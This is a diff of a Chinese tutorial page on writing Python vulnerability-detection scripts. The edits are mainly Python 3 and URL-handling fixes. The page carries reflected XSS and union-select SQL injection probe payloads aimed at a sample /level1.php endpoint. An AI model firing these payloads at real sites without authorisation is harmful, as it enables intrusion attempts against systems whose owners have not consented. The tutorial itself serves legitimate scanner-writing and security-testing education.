@@ -141,12 +141,16 @@ Host: 123.123.123.123
 ```python
 import requests
 target = ""
-url = target + "/level1.php?name=%3Cscript%3Ealert(1)%3C/script%3E"
+url = target.rstrip("/") + "/level1.php?name=%3Cscript%3Ealert(1)%3C/script%3E"
 req = requests.get(url，timeout=10)
 # 也可以这样：
 method = "GET"
 req = requests.request(method, url，timeout=10)
 ```
+
+如上代码，之所以需要加 `.rstrip("/")` ，是因为若输入 URL 中若结尾有 `/` ，即若输入 `http://a.com/` 而不是 `http://a.com` 时，部分矫情网站在访问过程中，脚本便会请求出错
+
+<figure><img src="../../.gitbook/assets/strip01.jpg" alt=""><figcaption></figcaption></figure>
 
 **burp图中有HOST，那怎么代码中没有呢？**
 
@@ -213,13 +217,12 @@ confirm("完成的不错！");
 ```python
 import requests
 headers = {
-    "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
+	"User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
 }
-target = ""
-url = target + "/level1.php?name=%3Cscript%3Ealert(1)%3C/script%3E"
+url = target.strip("/") + "/level1.php?name=%3Cscript%3Ealert(1)%3C/script%3E"
 req = requests.get(url, headers=headers, timeout=10)
 if req.status_code == 200 and "<script>alert(1)</script>" in req.text:
-    print "漏洞存在"
+	print("漏洞存在")
 ```
 
 那么再看看长亭的xray脚本，可以发现他们有在使用随机数，使用随机数的优势在于，我们可以通过这种手段，适当的减少误报
@@ -232,10 +235,10 @@ if req.status_code == 200 and "<script>alert(1)</script>" in req.text:
 import requests,random
 yuju = str(random.randint(0, 999999))
 target = ""
-url = target + "/level1.php?name=%3Cscript%3Ealert({yuju})%3C/script%3E"
+url = target.strip("/") + "/level1.php?name=%3Cscript%3Ealert({yuju})%3C/script%3E"
 req = requests.get(url)
 if req.status_code == 200 and "<script>alert({})</script>".format(yuju) in req.text:
-    print "漏洞存在"
+    print("漏洞存在")
 ```
 
 在上述脚本中，假设随机数为9999，那么脚本发送了`name=%3Cscript%3Ealert(9999)%3C/script%3E`，大意即为发送一个随机数到服务器，如果响应码为200，且响应体中也有`<script>alert(9999)</script>`存在，那么漏洞存在
@@ -259,7 +262,8 @@ req = requests.get(url,headers=headers, timeout=10, verify=False)
 如果是**POST**呢？
 
 ```python
-import requests,random
+import requests
+import random
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 url=......
@@ -276,7 +280,8 @@ req = requests.post(url,headers=headers, data=data, timeout=10, verify=False)
 在编写脚本时，可以将cookie处留空，方便在后续测试脚本的时候进行测试，或通过单独赋值的形式，通过外部传参传入cookie：
 
 ```python
-import requests,sys
+import requests
+import sys
 
 TARGET = sys.argv[0]
 COOKIE = sys.argv[1]
@@ -291,7 +296,9 @@ headers={"User-Agent": "Mozilla/5.0","Cookie": COOKIE}
 &#x20;众所周知，通常情况下，常见的HTTP认证的格式为：`Authorization: Basic YWRtaW46YWRtaW4=` 的类似格式，而在Basic后面跟着的，是一串Base64编码后的字符串，解开后，为admin:admin，也就是说，其用户名与密码都是admin。在脚本中又该如何体现呢？
 
 ```python
-import requests,base64,sys
+import requests
+import base64
+import sys
 
 aaa = "admin admin" # aaa = "admin:admin"
 if ":" in aaa or " " in aaa:
@@ -319,7 +326,9 @@ headers={"User-Agent": "Mozilla/5.0","Authorization": "Basic " + ddd}
 加上随机数，那么对应到脚本上，就是这样的：
 
 ```python
-import requests,random,hashlib
+import requests
+import random
+import hashlib
 yuju = str(random.randint(0, 999999))
 # mdfive,定义了yuju的MD5值，可以在SQL注入中直接使用
 mdfive = hashlib.md5(yuju).hexdigest()
@@ -327,7 +336,7 @@ target = ""
 url = target + "/level1.php?name=1 union select MD5({})".format(yuju)
 req = requests.get(url)
 if req.status_code == 200 and mdfive in req.text:
-    print "漏洞存在"
+    print("漏洞存在")
 ```
 
 **注意：若频繁使用md5(1),则可能发生误报，示例如下图：**
